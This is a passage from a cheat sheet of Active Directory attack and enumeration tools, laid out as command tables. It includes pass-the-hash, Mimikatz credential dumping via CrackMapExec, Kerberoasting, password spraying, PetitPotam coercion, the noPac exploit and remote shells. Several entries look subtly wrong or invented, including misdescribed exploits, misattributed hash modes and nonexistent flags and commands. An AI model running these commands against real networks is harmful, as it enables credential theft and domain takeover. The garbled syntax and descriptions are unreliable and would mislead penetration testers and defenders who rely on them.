    </tr>
  </tbody>
</table>

### rpcinfo / rpcclient  
*rpcinfo (Unix) and rpcclient (Samba) enumerate RPC services and perform RPC‑based AD enumeration.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>rpcinfo -p</code></td>
      <td><code>rpcinfo -p 10.0.0.1</code></td>
      <td>Lists RPC program numbers and protocols on the remote host.</td>
    </tr>
    <tr>
      <td><code>rpcinfo -u</code></td>
      <td><code>rpcinfo -u 10.0.0.1</code></td>
      <td>Displays UDP RPC services only.</td>
    </tr>
    <tr>
      <td><code>rpcclient -U "" -N</code></td>
      <td><code>rpcclient -U "" -N 10.0.0.1</code></td>
      <td>Anonymous RPC session for basic enumeration.</td>
    </tr>
    <tr>
      <td><code>-c enumdomusers</code></td>
      <td><code>rpcclient -U user%Pass 10.0.0.1 -c enumdomusers</code></td>
      <td>Enumerates domain usernames via RPC.</td>
    </tr>
    <tr>
      <td><code>-c enumdomgroups</code></td>
      <td><code>rpcclient -U user%Pass 10.0.0.1 -c enumdomgroups</code></td>
      <td>Enumerates domain groups via RPC.</td>
    </tr>
  </tbody>
</table>

### CrackMapExec (CME)  
*CME is a Swiss‑army post‑exploitation toolkit for enumeration, brute‑forcing, and module‑based attacks over SMB, WMI, WinRM, MSSQL, LDAP, and more.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>cme smb</code></td>
      <td><code>cme smb 10.0.0.1 -u Admin -p Pass</code></td>
      <td>Basic SMB login enumeration against a host.</td>
    </tr>
    <tr>
      <td><code>cme smb -H</code></td>
      <td><code>cme smb 10.0.0.1 -u "" -H hash.txt</code></td>
      <td>Pass-the-hash attack using NTLM hashes.</td>
    </tr>
    <tr>
      <td><code>-L -P</code></td>
      <td><code>cme smb 10.0.0.1 -L users.txt -P pass.txt --shares</code></td>
      <td>Enumerates shares using credential lists.</td>
    </tr>
    <tr>
      <td><code>cme winrm</code></td>
      <td><code>cme winrm 10.0.0.1 -u Admin -p Pass</code></td>
      <td>Attempts WinRM authentication and command execution.</td>
    </tr>
    <tr>
      <td><code>cme mssql</code></td>
      <td><code>cme mssql 10.0.0.1 -u SA -p Pass123!</code></td>
      <td>Connects to MS‑SQL, executes queries via provided creds.</td>
    </tr>
    <tr>
      <td><code>cme ldap</code></td>
      <td><code>cme ldap 10.0.0.1 -u user -p Pass</code></td>
      <td>Performs LDAP enumeration and simple queries.</td>
    </tr>
    <tr>
      <td><code>-M wmiexec</code></td>
      <td><code>cme smb 10.0.0.1 -u Admin -p Pass -M wmiexec</code></td>
      <td>Runs WMI exec module to execute commands remotely.</td>
    </tr>
    <tr>
      <td><code>-M mimikatz</code></td>
      <td><code>cme smb 10.0.0.1 -u Admin -p Pass -M mimikatz</code></td>
      <td>Dumps credentials from memory using Mimikatz module.</td>
    </tr>
  </tbody>
</table>

### NetExec  
*NetExec is a modular remote‑execution framework supporting multiple protocols (SMB, WMI, WinRM, MSSQL, LDAP, and more), with flexible authentication, threading, and output options.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>netexec smb</code></td>
      <td><code>netexec smb 10.0.0.1 -u Admin -p Pass!</code></td>
      <td>Execute commands remotely via SMB named‑pipe execution.</td>
    </tr>
    <tr>
      <td><code>netexec wmi</code></td>
      <td><code>netexec wmi 10.0.0.1 -u svc -p SvcPass! -c "whoami"</code></td>
      <td>Run a WMI method to execute a single command.</td>
    </tr>
    <tr>
      <td><code>netexec winrm</code></td>
      <td><code>netexec winrm 10.0.0.1 -u user -p Pass! --ssl</code></td>
      <td>Invoke a WinRM shell over SSL/TLS.</td>
    </tr>
    <tr>
      <td><code>netexec mssql</code></td>
      <td><code>netexec mssql 10.0.0.1 -u SA -p Pass123! -q "SELECT name FROM sys.databases"</code></td>
      <td>Execute T‑SQL queries against MS‑SQL Server.</td>
    </tr>
    <tr>
      <td><code>netexec ldap</code></td>
      <td><code>netexec ldap dc1.example.local -u user -p Pass! --search "(&(objectClass=user))"</code></td>
      <td>Perform LDAP searches for AD enumeration.</td>
    </tr>
    <tr>
      <td><code>netexec -H</code></td>
      <td><code>netexec smb 10.0.0.1 -u "" -H aad3b435...:31d6cfe0...</code></td>
      <td>Authenticate via NTLM pass‑the‑hash.</td>
    </tr>
    <tr>
      <td><code>netexec --no-pass</code></td>
      <td><code>netexec smb 10.0.0.1 --no-pass</code></td>
      <td>Attempt anonymous execution/enumeration.</td>
    </tr>
    <tr>
      <td><code>netexec --dc-ip</code></td>
      <td><code>netexec ldap example.local -u svc -p SvcPass --dc-ip 10.0.0.2</code></td>
      <td>Specify a particular DC IP for LDAP traffic.</td>
    </tr>
    <tr>
      <td><code>netexec --threads</code></td>
      <td><code>netexec smb 10.0.0.1 -u Admin -p Pass! --threads 25</code></td>
      <td>Run up to 25 parallel execution threads.</td>
    </tr>
    <tr>
      <td><code>netexec --timeout</code></td>
      <td><code>netexec winrm 10.0.0.1 -u user -p Pass --timeout 20</code></td>
      <td>Set connection timeout to 20 seconds.</td>
    </tr>
    <tr>
      <td><code>netexec --port</code></td>
      <td><code>netexec winrm 10.0.0.1 -u user -p Pass --port 5986</code></td>
      <td>Use a custom port (e.g., 5986 for WinRM SSL).</td>
    </tr>
    <tr>
      <td><code>netexec --kerberos</code></td>
      <td><code>netexec smb dc1 -u user --kerberos --ticket TGT.kirbi</code></td>
      <td>Authenticate using a Kerberos ticket file.</td>
    </tr>
    <tr>
      <td><code>netexec --command</code></td>
      <td><code>netexec smb 10.0.0.1 -u svc -p P@ss! --command "net localgroup administrators"</code></td>
      <td>Specify the exact command to run remotely.</td>
    </tr>
    <tr>
      <td><code>netexec --share</code></td>
      <td><code>netexec smb 10.0.0.1 -u Admin -p Pass! --share ADMIN$</code></td>
      <td>Direct SMB execution through a particular share.</td>
    </tr>
    <tr>
      <td><code>netexec --output</code></td>
      <td><code>netexec wmi 10.0.0.1 -u user -p Pass! --output results.txt</code></td>
      <td>Save the remote command output locally.</td>
    </tr>
    <tr>
      <td><code>netexec --interactive</code></td>
      <td><code>netexec smb 10.0.0.1 -u Admin -p Pass! --interactive</code></td>
      <td>Establish an interactive remote shell session.</td>
    </tr>
    <tr>
      <td><code>netexec --ssl</code></td>
      <td><code>netexec winrm 10.0.0.1 -u user -p Pass! --ssl</code></td>
      <td>Encrypt the protocol transport (SMB/WMI/WinRM) with SSL/TLS.</td>
    </tr>
  </tbody>
</table>

### Rubeus  
*Rubeus is a C# tool built for Kerberos abuse—dumping, requesting, renewing, and forging tickets for post‑exploitation.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>Rubeus.exe kerberoast</code></td>
      <td><code>Rubeus.exe kerberoast /domain:corp.local /outfile:krb.json</code></td>
      <td>Dump TGS tickets for all SPNs for offline cracking.</td>
    </tr>
    <tr>
      <td><code>Rubeus.exe asktgt</code></td>
      <td><code>Rubeus.exe asktgt /user:svc_sql /password:Pass123! /domain:corp.local</code></td>
      <td>Obtain a TGT for a service account with credentials.</td>
    </tr>
    <tr>
      <td><code>Rubeus.exe renew</code></td>
      <td><code>Rubeus.exe renew /ticket:ticket.kirbi /outfile:renewed.kirbi</code></td>
      <td>Renew an existing TGT to extend its validity.</td>
    </tr>
    <tr>
      <td><code>Rubeus.exe s4uuser</code></td>
      <td><code>Rubeus.exe s4uuser /user:krbtgt /impersonateuser:alice /ticket:ticket.kirbi</code></td>
      <td>Perform S4U2self + S4U2proxy to impersonate another user.</td>
    </tr>
    <tr>
      <td><code>Rubeus.exe dump</code></td>
      <td><code>Rubeus.exe dump /tickets</code></td>
      <td>Extract all Kerberos tickets from LSASS memory.</td>
    </tr>
  </tbody>
</table>

### GetUserSPNs.py  
*GetUserSPNs.py is an Impacket script for enumerating Service Principal Names (SPNs) to support Kerberoasting attacks.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>GetUserSPNs.py -request</code></td>
      <td><code>python GetUserSPNs.py -request -dc dc1.corp.local -u svc_account -p SvcPass!</code></td>
      <td>Request TGS tickets for all SPNs and save to JSON files for offline cracking.</td>
    </tr>
    <tr>
      <td><code>--format</code></td>
      <td><code>python GetUserSPNs.py -request -dc dc1 -u svc -p Pass123! --format json</code></td>
      <td>Output results in JSON format instead of separate files.</td>
    </tr>
    <tr>
      <td><code>--outfile</code></td>
      <td><code>python GetUserSPNs.py -request -dc dc1 -u svc -p Pass! --outfile spns.json</code></td>
      <td>Merge all SPN results into a single output file.</td>
    </tr>
    <tr>
      <td><code>--dc-ip</code></td>
      <td><code>python GetUserSPNs.py -request -dc corp.local -u svc -p Pass! --dc-ip 10.0.0.1</code></td>
      <td>Specify a particular domain controller IP for LDAP queries.</td>
    </tr>
    <tr>
      <td><code>--help</code></td>
      <td><code>python GetUserSPNs.py --help</code></td>
      <td>Display usage and full list of options.</td>
    </tr>
  </tbody>
</table>

### Hashcat  
*Hashcat is a GPU‑accelerated password recovery tool supporting hundreds of hash types and a variety of attack modes.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>-m [hash-type]</code></td>
      <td><code>hashcat -m 13100 -a 0 krb5pa* hashes.txt wordlist.txt</code></td>
      <td>Crack Kerberos 5 Pre‑Auth hashes using a wordlist.</td>
    </tr>
    <tr>
      <td><code>-a 3</code></td>
      <td><code>hashcat -m 13100 -a 3 krb5pa* ?l?l?l?l?d?d?d</code></td>
      <td>Use brute‑force mask attack (4 letters + 3 digits).</td>
    </tr>
    <tr>
      <td><code>--show</code></td>
      <td><code>hashcat -m 1000 --show NTLM_hashes.txt</code></td>
      <td>Display already cracked NTLM hashes from previous runs.</td>
    </tr>
    <tr>
      <td><code>-o [outfile]</code></td>
      <td><code>hashcat -m 0 -a 0 -o cracked.txt md5_hashes.txt rockyou.txt</code></td>
      <td>Save cracked MD5 hashes to <em>cracked.txt</em>.</td>
    </tr>
    <tr>
      <td><code>--status</code></td>
      <td><code>hashcat -m 0 -a 3 md5.txt ?a?a?a?a --status</code></td>
      <td>Show real‑time status updates while cracking.</td>
    </tr>
  </tbody>
</table>

### enum4linux  
*enum4linux is a Perl script leveraging SMB, RPC, and SNMP to extract user, group, share, and password policy information from Windows hosts.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>enum4linux [target]</code></td>
      <td><code>enum4linux 192.168.1.100</code></td>
      <td>Run default SMB/RPC enumeration against the target.</td>
    </tr>
    <tr>
      <td><code>-a</code></td>
      <td><code>enum4linux -a 192.168.1.100</code></td>
      <td>Enable all enumeration options (verbose + advanced).</td>
    </tr>
    <tr>
      <td><code>-U</code></td>
      <td><code>enum4linux -U 192.168.1.100</code></td>
      <td>Pull a list of domain users.</td>
    </tr>
    <tr>
      <td><code>-S</code></td>
      <td><code>enum4linux -S 192.168.1.100</code></td>
      <td>Enumerate SMB shares and permissions.</td>
    </tr>
    <tr>
      <td><code>-o</code></td>
      <td><code>enum4linux -o output.txt 192.168.1.100</code></td>
      <td>Write all output to a file.</td>
    </tr>
  </tbody>
</table>

### enum4linux‑ng  
*enum4linux‑ng is a Python3 rewrite of enum4linux that offers faster execution, JSON output, and additional modern features.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>enum4linux-ng -t</code></td>
      <td><code>enum4linux-ng -t 192.168.1.100</code></td>
      <td>Basic enumeration using default modules.</td>
    </tr>
    <tr>
      <td><code>-a</code></td>
      <td><code>enum4linux-ng -a 192.168.1.100</code></td>
      <td>Run all enumeration modules (similar to -a in original).</td>
    </tr>
    <tr>
      <td><code>-u / -p</code></td>
      <td><code>enum4linux-ng -u user -p Pass! 192.168.1.100</code></td>
      <td>Authenticate with credentials to enumerate restricted data.</td>
    </tr>
    <tr>
      <td><code>--json</code></td>
      <td><code>enum4linux-ng --json 192.168.1.100</code></td>
      <td>Output results in JSON format for parsing.</td>
    </tr>
    <tr>
      <td><code>-o [file]</code></td>
      <td><code>enum4linux-ng -o results.json 192.168.1.100</code></td>
      <td>Save the JSON output to the specified file.</td>
    </tr>
  </tbody>
</table>

### windapsearch  
*windapsearch is a Python LDAP enumeration script for dumping users, groups, computers, and other AD objects via LDAP queries.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>windapsearch.py</code></td>
      <td><code>python windapsearch.py -d corp.local</code></td>
      <td>Enumerate common AD objects (users, groups, computers) anonymously.</td>
    </tr>
    <tr>
      <td><code>-u / -p</code></td>
      <td><code>python windapsearch.py -d corp.local -u svc -p Pass123!</code></td>
      <td>Bind with credentials to enumerate restricted data.</td>
    </tr>
    <tr>
      <td><code>--filter</code></td>
      <td><code>python windapsearch.py -d corp.local --filter "(objectClass=user)"</code></td>
      <td>Only return user objects matching the LDAP filter.</td>
    </tr>
    <tr>
      <td><code>--out-json</code></td>
      <td><code>python windapsearch.py -d corp.local --out-json results.json</code></td>
      <td>Save full enumeration results as JSON.</td>
    </tr>
    <tr>
      <td><code>--search-base</code></td>
      <td><code>python windapsearch.py -d corp.local --search-base "OU=Servers,DC=corp,DC=local"</code></td>
      <td>Limit search to a specific OU.</td>
    </tr>
  </tbody>
</table>

### DomainPasswordSpray.ps1  
*DomainPasswordSpray.ps1 is a PowerShell script for performing password spray attacks against many AD accounts while minimizing lockouts.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>-UsersFile</code></td>
      <td><code>.\DomainPasswordSpray.ps1 -UsersFile users.txt -PasswordList pwds.txt</code></td>
      <td>Spray a list of passwords across many users.</td>
    </tr>
    <tr>
      <td><code>-DomainController</code></td>
      <td><code>.\DomainPasswordSpray.ps1 -UsersFile u.txt -PasswordList p.txt -DomainController dc01.corp.local</code></td>
      <td>Target the specified DC instead of auto-discovery.</td>
    </tr>
    <tr>
      <td><code>-Delay</code></td>
      <td><code>.\DomainPasswordSpray.ps1 ... -Delay 5000</code></td>
      <td>Pause 5 seconds between each attempt to reduce lockouts.</td>
    </tr>
    <tr>
      <td><code>-OutFile</code></td>
      <td><code>.\DomainPasswordSpray.ps1 ... -OutFile spray_results.csv</code></td>
      <td>Log successes/failures into a CSV.</td>
    </tr>
    <tr>
      <td><code>-Verbose</code></td>
      <td><code>.\DomainPasswordSpray.ps1 ... -Verbose</code></td>
      <td>Show detailed attempt output in console.</td>
    </tr>
  </tbody>
</table>

### LAPSToolkit  
*LAPSToolkit is a PowerShell module for auditing and abusing Microsoft's Local Administrator Password Solution (LAPS).*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>Import-Module</code></td>
      <td><code>Import-Module .\LAPSToolkit.psm1</code></td>
      <td>Load LAPS functions into your session.</td>
    </tr>
    <tr>
      <td><code>Get-LAPSADAccounts</code></td>
      <td><code>Get-LAPSADAccounts -Domain corp.local</code></td>
      <td>List computer accounts with LAPS-managed passwords.</td>
    </tr>
    <tr>
      <td><code>Invoke-LAPSUser</code></td>
      <td><code>Invoke-LAPSUser -ComputerName SRV01</code></td>
      <td>Retrieve the local admin password for SRV01.</td>
    </tr>
    <tr>
      <td><code>Invoke-LAPSPSRemote</code></td>
      <td><code>Invoke-LAPSPSRemote -ComputerName DC01 -ScriptBlock { whoami }</code></td>
      <td>Run a remote PowerShell script using the LAPS password.</td>
    </tr>
    <tr>
      <td><code>-Verbose</code></td>
      <td><code>Get-LAPSADAccounts -Verbose</code></td>
      <td>Display detailed operation logging.</td>
    </tr>
  </tbody>
</table>

### smbmap  
*smbmap is a Python tool for enumerating and interacting with SMB shares, supporting recursive download and credential attacks.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>smbmap -H</code></td>
      <td><code>smbmap -H 10.0.0.1 -u user -p Pass</code></td>
      <td>Basic share enumeration with credentials.</td>
    </tr>
    <tr>
      <td><code>-R</code></td>
      <td><code>smbmap -H 10.0.0.1 -R</code></td>
      <td>Recursively download files from all accessible shares.</td>
    </tr>
    <tr>
      <td><code>--shares</code></td>
      <td><code>smbmap -H 10.0.0.1 --shares</code></td>
      <td>Only list share names and permissions.</td>
    </tr>
    <tr>
      <td><code>--no-pass</code></td>
      <td><code>smbmap -H target -u guest --no-pass</code></td>
      <td>Attempt anonymous login to enumerate shares.</td>
    </tr>
    <tr>
      <td><code>--domain</code></td>
      <td><code>smbmap -H 10.0.0.1 -u user -p Pass -d CORP</code></td>
      <td>Specify domain for authentication in AD environments.</td>
    </tr>
  </tbody>
</table>

### evil‑winrm  
*evil‑winrm is a Ruby-based client for obtaining an interactive WinRM shell on Windows hosts over HTTP(S).*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>evil-winrm -i -u -p</code></td>
      <td><code>evil-winrm -i 10.0.0.1 -u admin -p Pass!</code></td>
      <td>Launch interactive WinRM shell.</td>
    </tr>
    <tr>
      <td><code>--transport ssl</code></td>
      <td><code>evil-winrm -i 10.0.0.1 -u admin -p Pass! --transport ssl</code></td>
      <td>Force SSL/TLS transport for the session.</td>
    </tr>
    <tr>
      <td><code>-c</code></td>
      <td><code>evil-winrm -i 10.0.0.1 -u user -p Pass -c whoami</code></td>
      <td>Execute single command and exit.</td>
    </tr>
    <tr>
      <td><code>--kerb</code></td>
      <td><code>evil-winrm -i dc1 -u user -H &lt;hash&gt; --kerb</code></td>
      <td>Authenticate using NTLM hash or Kerberos ticket.</td>
    </tr>
    <tr>
      <td><code>--cert</code></td>
      <td><code>evil-winrm -i host -u svc -p Pass --cert cert.pfx</code></td>
      <td>Use client certificate for WinRM auth.</td>
    </tr>
  </tbody>
</table>

### Snaffler  
*Snaffler is a Python tool for scanning file shares (SMB, NFS, HTTP) to locate sensitive authentication artifacts like hashes and tokens.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>snaffler.py -t smb</code></td>
      <td><code>python snaffler.py -u user -p Pass -t smb</code></td>
      <td>Scan SMB shares for credential leakage patterns.</td>
    </tr>
    <tr>
      <td><code>-r report.html</code></td>
      <td><code>python snaffler.py -r creds.html</code></td>
      <td>Generate HTML report of findings.</td>
    </tr>
    <tr>
      <td><code>-p wordlist.txt</code></td>
      <td><code>python snaffler.py -p passwords.txt</code></td>
      <td>Supply custom patterns/keywords file for scanning.</td>
    </tr>
    <tr>
      <td><code>-v</code></td>
      <td><code>python snaffler.py -v</code></td>
      <td>Verbose output to console.</td>
    </tr>
    <tr>
      <td><code>--timeout</code></td>
      <td><code>python snaffler.py --timeout 10</code></td>
      <td>Set network timeout in seconds per connection.</td>
    </tr>
  </tbody>
</table>

### smbserver.py  
*smbserver.py is part of Impacket—hosts a local directory over SMB to easily transfer or serve payloads to Windows hosts.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>smbserver.py share /tmp/files</code></td>
      <td><code>python smbserver.py share /tmp/files</code></td>
      <td>Export folder as SMB share named “share”.</td>
    </tr>
    <tr>
      <td><code>--smb2support</code></td>
      <td><code>python smbserver.py share /tmp --smb2support</code></td>
      <td>Enable SMB2/3 protocol support.</td>
    </tr>
    <tr>
      <td><code>--username attacker</code></td>
      <td><code>python smbserver.py share /tmp --username attacker</code></td>
      <td>Set a valid SMB user name (no password).</td>
    </tr>
    <tr>
      <td><code>--password P@ssw0rd</code></td>
      <td><code>python smbserver.py share /tmp --username attacker --password P@ssw0rd</code></td>
      <td>Require password authentication for the share.</td>
    </tr>
    <tr>
      <td><code>--logfile smb.log</code></td>
      <td><code>python smbserver.py share /tmp --logfile smb.log</code></td>
      <td>Log all activity to a file.</td>
    </tr>
  </tbody>
</table>

### setspn.exe  
*setspn.exe is a built‑in Windows utility for querying and manipulating Service Principal Names (SPNs) in Active Directory.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>setspn.exe -L svc_account</code></td>
      <td><code>setspn.exe -L svc_account</code></td>
      <td>List all SPNs for the specified service account.</td>
    </tr>
    <tr>
      <td><code>-S</code></td>
      <td><code>setspn.exe -S HTTP/web.corp.local svc_account</code></td>
      <td>Add SPN if not already present, checking duplicates.</td>
    </tr>
    <tr>
      <td><code>-D</code></td>
      <td><code>setspn.exe -D HOST/server.corp.local svc_account</code></td>
      <td>Remove the specified SPN entry.</td>
    </tr>
    <tr>
      <td><code>-Q</code></td>
      <td><code>setspn.exe -Q */server.corp.local</code></td>
      <td>Query which account owns the given SPN.</td>
    </tr>
    <tr>
      <td><code>-X</code></td>
      <td><code>setspn.exe -X</code></td>
      <td>Scan the domain for duplicate SPNs.</td>
    </tr>
  </tbody>
</table>

### PetitPotam.py  
*PetitPotam.py is a Python PoC to coerce Windows hosts into authenticating via MS-EFSRPC RPC calls (e.g., EfsRpcOpenFileRaw).*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>PetitPotam.py -t</code></td>
      <td><code>python PetitPotam.py -t dc1.corp.local -u user -p Pass!</code></td>
      <td>Coerce target to authenticate via EfsRpcOpenFileRaw.</td>
    </tr>
    <tr>
      <td><code>--certificate</code></td>
      <td><code>python PetitPotam.py -t dc1 -u user -p Pass! --certificate</code></td>
      <td>Use certificate auth coercion instead of NTLM.</td>
    </tr>
    <tr>
      <td><code>--timeout</code></td>
      <td><code>python PetitPotam.py -t dc1 --timeout 5</code></td>
      <td>Set a connection timeout of 5 seconds.</td>
    </tr>
    <tr>
      <td><code>-h/--help</code></td>
      <td><code>python PetitPotam.py -h</code></td>
      <td>Display help and usage options.</td>
    </tr>
  </tbody>
</table>

### noPac.py  
*noPac.py exploits CVE‑2021‑42278/42287 to manipulate userAccountControl attributes and add users to privileged OUs.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>noPac.py</code></td>
      <td><code>python noPac.py -u user -p Pass! -d corp.local</code></td>
      <td>Exploit CVE‑2021‑42278/42287 to add yourself to a new OU.</td>
    </tr>
    <tr>
      <td><code>--ou</code></td>
      <td><code>python noPac.py ... --ou "OU=Admins,DC=corp,DC=local"</code></td>
      <td>Specify target OU for privilege escalation.</td>
    </tr>
    <tr>
      <td><code>--dc</code></td>
      <td><code>python noPac.py ... --dc dc2.corp.local</code></td>
      <td>Target a specific domain controller for the exploit.</td>
    </tr>
    <tr>
      <td><code>-v</code></td>
      <td><code>python noPac.py ... -v</code></td>
      <td>Verbose output for debugging exploit steps.</td>
    </tr>
  </tbody>
</table>

### adidnsdump  
*adidnsdump.py is an Impacket script to enumerate and dump all AD‑integrated DNS records from a domain controller.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>adidnsdump.py -d</code></td>
      <td><code>python adidnsdump.py -d corp.local -u user -p Pass!</code></td>
      <td>Dump all AD‑integrated DNS records.</td>
    </tr>
    <tr>
      <td><code>--zone</code></td>
      <td><code>python adidnsdump.py -d corp.local --zone corp.local</code></td>
      <td>Limit dump to a specific DNS zone.</td>
    </tr>
    <tr>
      <td><code>--outfile</code></td>
      <td><code>python adidnsdump.py ... --outfile dns.txt</code></td>
      <td>Save output to a text file.</td>
    </tr>
    <tr>
      <td><code>-v</code></td>
      <td><code>python adidnsdump.py ... -v</code></td>
      <td>Verbose mode for detailed logs.</td>
    </tr>
  </tbody>
</table>

### gpp‑decrypt  
*gpp‑decrypt extracts and decrypts passwords stored in Group Policy Preferences XML files.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>gpp-decrypt</code></td>
      <td><code>gpp-decrypt "ABCD1234..."</code></td>
      <td>Decrypt a single encrypted password string.</td>
    </tr>
    <tr>
      <td><code>--input-file</code></td>
      <td><code>gpp-decrypt --input-file gpo.xml</code></td>
      <td>Parse an entire GPO XML and decrypt all secrets.</td>
    </tr>
    <tr>
      <td><code>--output</code></td>
      <td><code>gpp-decrypt --input-file gpo.xml --output creds.csv</code></td>
      <td>Export decrypted credentials into a CSV.</td>
    </tr>
    <tr>
      <td><code>--quiet</code></td>
      <td><code>gpp-decrypt "ABCD" --quiet</code></td>
      <td>Only print decrypted strings, suppress extra output.</td>
    </tr>
  </tbody>
</table>

### ADExplorer (ADExplorer.exe)  
*ADExplorer is a GUI tool from Sysinternals for browsing, editing, and snapshotting Active Directory databases.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>ADExplorer.exe</code></td>
      <td><code>ADExplorer.exe</code></td>
      <td>Launch the GUI for live AD browsing.</td>
    </tr>
    <tr>
      <td><code>–f &lt;file&gt;</code></td>
      <td><code>ADExplorer.exe –f dump.ad1</code></td>
      <td>Open a saved snapshot for offline analysis.</td>
    </tr>
    <tr>
      <td><code>File → Save</code></td>
      <td><em>GUI action</em></td>
      <td>Save the current AD view to a .ad1 snapshot.</td>
    </tr>
    <tr>
      <td><code>View → Attributes</code></td>
      <td><em>GUI action</em></td>
      <td>Toggle detailed attribute display for selected object.</td>
    </tr>
  </tbody>
</table>

### PingCastle  
*PingCastle is an AD security auditing tool that produces risk assessments and maturity scores based on best practices.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>PingCastle.exe --healthcheck</code></td>
      <td><code>PingCastle.exe --healthcheck corp.local</code></td>
      <td>Full domain security assessment.</td>
    </tr>
    <tr>
      <td><code>--CSV</code></td>
      <td><code>PingCastle.exe --healthcheck corp.local --CSV</code></td>
      <td>Export results into CSV format.</td>
    </tr>
    <tr>
      <td><code>--ADCS</code></td>
      <td><code>PingCastle.exe --ADCS corp.local</code></td>
      <td>Audit Active Directory Certificate Services.</td>
    </tr>
    <tr>
      <td><code>--quickview</code></td>
      <td><code>PingCastle.exe --quickview corp.local</code></td>
      <td>Generate a high‑level summary report.</td>
    </tr>
  </tbody>
</table>

### Group3r  
*Group3r is a Windows .NET tool for auditing GPOs—analyzing security settings, user rights, and delegation across Group Policy Objects.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>Group3r.exe /scanGPO</code></td>
      <td><code>Group3r.exe /scanGPO corp.local</code></td>
      <td>Audit GPO security settings across domain.</td>
    </tr>
    <tr>
      <td><code>/output &lt;file&gt;</code></td>
      <td><code>Group3r.exe /scanGPO corp.local /output gpo.html</code></td>
      <td>Generate an HTML findings report.</td>
    </tr>
    <tr>
      <td><code>/scanUserRights</code></td>
      <td><code>Group3r.exe /scanUserRights corp.local</code></td>
      <td>Review user rights assignments in GPOs.</td>
    </tr>
    <tr>
      <td><code>/scanDelegation</code></td>
      <td><code>Group3r.exe /scanDelegation corp.local</code></td>
      <td>Identify delegation weaknesses in AD.</td>
    </tr>
  </tbody>
</table>

### ADRecon  
*ADRecon is a PowerShell framework for collecting a broad set of AD data (users, groups, ACLs, trusts, GPOs) and exporting to Excel/CSV.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
